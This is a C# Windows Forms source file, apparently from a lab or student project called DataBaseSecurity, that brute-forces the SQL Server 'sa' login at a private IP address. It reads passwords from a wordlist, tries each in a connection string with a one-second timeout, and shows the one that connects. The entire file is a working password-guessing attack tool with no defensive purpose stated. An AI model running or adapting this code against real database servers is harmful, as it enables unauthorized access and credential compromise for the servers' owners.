using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.Sql;
using System.Data.SqlClient;


namespace DataBaseSecurity
{
    public partial class frmBruteForce : Form
    {
        public frmBruteForce()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            string cs;
            string serverIP="192.168.74.128";
            string username="sa";
            string dbname="MASTER";
            string passWord;
            int i;
            int k = 0;
            int count=Convert.ToInt32(txtCount.Text);

            System.IO.StreamReader sr=new System.IO.StreamReader(@"..\..\uniqpass_preview.txt");

            lstPasswordList.Items.Clear();
            for (i = 0; i < count; i++)
            {
                k++;
                passWord = sr.ReadLine();
                lblPassword.Text = passWord;
                lstPasswordList.Items.Add(passWord);
                Update();
                if (k>=15)
                {
                    k = 0;
                    lstPasswordList.Items.Clear();
                }
                cs = "DATA SOURCE=" + serverIP+";INITIAL CATALOG = "+dbname+";UID="+username+";PASSWORD="+passWord+";CONNECT TIMEOUT=1";
                
                try {

                    SqlConnection conn = new SqlConnection(cs);
                    conn.Open();
                    if (conn.State == ConnectionState.Open)
                    {
                        lblPassword.Text = "Connected ! the password is " + passWord;
                        return;
                    }
                } catch (Exception) {
                
                }

                
            }

        }
    }
}
